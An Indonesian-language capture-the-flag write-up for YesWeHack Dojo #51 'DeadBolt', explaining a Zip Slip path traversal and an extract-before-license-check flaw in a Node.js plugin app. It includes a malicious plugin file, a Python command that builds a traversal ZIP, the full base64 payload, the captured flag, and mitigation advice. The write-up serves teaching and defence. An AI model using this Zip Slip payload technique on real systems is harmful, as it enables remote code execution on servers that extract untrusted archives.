@@ -0,0 +1,85 @@
***YesWeHack Dojo #51 - DeadBolt Writeup 🚩***
https://dojo-yeswehack.com/challenge-of-the-month/dojo-51

Deskripsi TantanganDeadBolt adalah tantangan private marketplace berbasis Node.js. Pengguna diharuskan memiliki license key yang valid untuk mengakses dan menjalankan plugin. Tujuan utamanya adalah mendapatkan isi dari ```process.env.FLAG``` tanpa melakukan brute force pada kunci lisensi.

Analisis Kerentanan

1. Arbitrary File Write (Zip Slip)Pada fungsi ```unzip```, aplikasi menggunakan modul ```yauzl``` untuk mengekstrak file ZIP yang diunggah pengguna dalam format Base64. Kerentanan terjadi karena nama file di dalam ZIP ```(entry.fileName)``` langsung digabungkan menggunakan path.join tanpa validasi karakter path traversal.

```javascript
// Cuplikan kode rentan
const filenameStr = entry.fileName.toString();
const destpath = path.join(dest, filenameStr); // Tidak ada sanitasi terhadap '../../'
```

2. Urutan Eksekusi (Logic Flaw)

Aplikasi melakukan proses ekstraksi ZIP sebelum melakukan validasi lisensi. Hal ini memungkinkan penyerang untuk memanipulasi sistem file server meskipun kunci lisensi yang diberikan salah.

```javascript
await unzip(destZip, destArchive); // Ekstraksi berjalan dulu
if ( validateKey(key) ) { ... }    // Validasi lisensi belakangan
```

***Metodologi Eksploitasi***

Strategi: Remote Code Execution (RCE) via Plugin Overwrite

Karena aplikasi memuat semua plugin dari direktori /app/plugins/ menggunakan getPlugins(), kita bisa menimpa file plugin yang ada atau membuat plugin baru menggunakan teknik Zip Slip.

Langkah-langkah Teknis:

  1. Membuat Payload Plugin (official.js):Kita membuat plugin yang akan mencetak Flag ke konsol/output saat dimuat oleh sistem.

```javascript
console.log(process.env.FLAG); 
module.exports = { 
    getName: () => 'official', 
    run: () => { console.log(process.env.FLAG) }, 
    get: () => ({name:'official'}) 
};
```

  2. Membungkus Payload ke dalam ZIP (Path Traversal):

Menggunakan Python untuk menyisipkan karakter ../ agar file keluar dari folder archive dan masuk ke folder plugins

```bash
python3 -c "import zipfile; z = zipfile.ZipFile('exploit.zip', 'w'); z.write('official.js', '../official.js')"
```

  3. Encoding ke Base64:

     Mengonversi file ZIP menjadi string Base64 untuk dikirimkan melalui parameter ```zipbase64.```
```bash
base64 -w 0 exploit.zip
```

     
  4. Eksekusi:
    
 Mengirimkan Base64 tersebut ke aplikasi. Saat aplikasi memuat daftar plugin, kode jahat kita dieksekusi oleh server dan Flag berhasil didapatkan.

Hasil (Proof of Concept)Setelah mengirimkan payload, server mengeksekusi kode dan membocorkan flag:

````Flag: YWH{D0nt_trust_Z1p_Filenames_And_Ch3ck_L1cens3_F1rst}````

Kesimpulan & Mitigasi

* * Mitigasi Zip Slip: Selalu validasi nama file di dalam arsip ZIP. Pastikan jalur tujuan tidak keluar dari direktori yang ditentukan (gunakan path.resolve dan pastikan hasilnya dimulai dengan direktori tujuan).

* * Logic Check: Lakukan pengecekan otorisasi/lisensi di awal sebelum memproses input yang berat atau melakukan operasi tulis file.
 
  * <img width="422" height="538" alt="image" src="https://github.com/user-attachments/assets/ddbd7058-6650-45cc-9ad5-288d009e8133" />

 
    ```
    KEY: 123
    PLUGIN: hack
    zipbase64: UEsDBBQAAAAAAMGapFx19oqynQAAAJ0AAAAOAAAALi4vb2ZmaWNpYWwuanNjb25zb2xlLmxvZyhwcm9jZXNzLmVudi5GTEFHKTsgbW9kdWxlLmV4cG9ydHMgPSB7IGdldE5hbWU6ICgpID0+ICdvZmZpY2lhbCcsIHJ1bjogKCkgPT4geyBjb25zb2xlLmxvZyhwcm9jZXNzLmVudi5GTEFHKSB9LCBnZXQ6ICgpID0+ICh7bmFtZTonb2ZmaWNpYWwnfSkgfTsKUEsBAhQDFAAAAAAAwZqkXHX2irKdAAAAnQAAAA4AAAAAAAAAAAAAAKSBAAAAAC4uL29mZmljaWFsLmpzUEsFBgAAAAABAAEAPAAAAMkAAAAAAA==
    ```
    

<img width="1355" height="694" alt="image" src="https://github.com/user-attachments/assets/c6a6cd0f-9f48-4864-b954-1bdd7631079c" />
